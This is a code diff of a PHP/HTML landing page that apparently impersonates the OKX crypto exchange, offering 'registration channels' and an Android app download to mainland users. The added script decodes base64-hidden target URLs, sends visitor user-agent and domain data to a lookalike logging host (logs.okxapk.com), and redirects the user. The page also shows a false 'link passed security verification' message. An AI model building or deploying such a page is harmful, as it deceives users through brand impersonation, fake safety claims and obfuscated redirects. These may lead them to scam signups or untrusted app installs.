@@ -13,7 +13,7 @@ $encryptedBackup2 = base64_encode($backupUrl2);
   <meta charset="UTF-8">
   <meta name="robots" content="noindex, nofollow">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>OKX</title>
+  <title>欧易注册入口(国内用户专属）</title>
   <style>
     :root {
       --primary: #13bd2c;
@@ -157,7 +157,7 @@ $encryptedBackup2 = base64_encode($backupUrl2);
     
     <h1>链接已通过安全验证</h1>
     <p>系统已自动为您选择最优注册通道</p>
-      <h3 style="color: green;" >若Wifi打开慢，请切换至5G再次尝试</h3>
+        <h3 style="color: red;" >Win和iOS版请注册后进入下载</h3>
     <div class="btn-group">
       <button class="btn btn-primary" onclick="startDownload(event, 'primary')">
        主要注册入口
@@ -176,6 +176,14 @@ $encryptedBackup2 = base64_encode($backupUrl2);
     </div>
     
     <p class="notice">如果主通道无法进入，请尝试备用通道</p>
+        <div class="btn-group" style="margin-top: 2rem;">
+    <a href="/jump/android.php" class="btn btn-primary" style="text-decoration: none;" target="_blank">
+      立即下载欧易(安卓版)
+    </a>
+    <a href="/" class="btn btn-secondary" style="text-decoration: none;">
+      返回首页
+    </a>
+  </div>
   </div>
 
   <script>
@@ -195,34 +203,57 @@ $encryptedBackup2 = base64_encode($backupUrl2);
       }
     };
 
-    function startDownload(event, type) {
-      // 阻止默认行为
-      event.preventDefault();
-      
-      // 获取配置
-      const config = downloadConfig[type];
-      if (!config) return;
-      
-      // 获取元素
-      const clickedBtn = event.currentTarget;
-      const loader = document.getElementById(config.loaderId);
-      
-      // 更新UI状态
-      clickedBtn.disabled = true;
-      clickedBtn.classList.add('disabled');
-      if (loader) loader.style.display = 'inline-block';
-      
-      // 使用新窗口打开下载
-      const downloadWindow = window.open('about:blank', '_blank');
-      downloadWindow.location.href = `redirect.php?type=${type}&token=${config.token}`;
-      
-      // 5秒后恢复按钮状态
-      setTimeout(() => {
-        clickedBtn.disabled = false;
-        clickedBtn.classList.remove('disabled');
-        if (loader) loader.style.display = 'none';
-      }, 5000);
+ function startDownload(event, type) {
+    event.preventDefault();
+
+    const config = downloadConfig[type];
+    if (!config) return;
+
+    const clickedBtn = event.currentTarget;
+    const loader = document.getElementById(config.loaderId);
+
+    clickedBtn.disabled = true;
+    clickedBtn.classList.add('disabled');
+    if (loader) loader.style.display = 'inline-block';
+
+    try {
+      // 解码真实链接
+      const decodedUrl = atob(config.token);
+      const sourceDomain = window.location.hostname;
+      const targetDomain = new URL(decodedUrl).hostname;
+
+          // 记录点击日志（异步，不阻塞跳转）
+     const logData = {
+  type: type,
+  source: window.location.hostname,
+  target: new URL(decodedUrl).hostname,
+  ua: navigator.userAgent
+};
+
+fetch('https://logs.okxapk.com/log/log_sigup.php', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify(logData),
+  keepalive: true
+}).catch(() => {});
+
+      // 尝试打开新窗口
+      const newWindow = window.open(decodedUrl, '_blank');
+      if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
+        window.location.href = decodedUrl;
+      }
+    } catch (e) {
+      console.error('下载失败:', e);
     }
+
+    setTimeout(() => {
+      clickedBtn.disabled = false;
+      clickedBtn.classList.remove('disabled');
+      if (loader) loader.style.display = 'none';
+    }, 3000);
+  }
   </script>
 </body>
 </html>
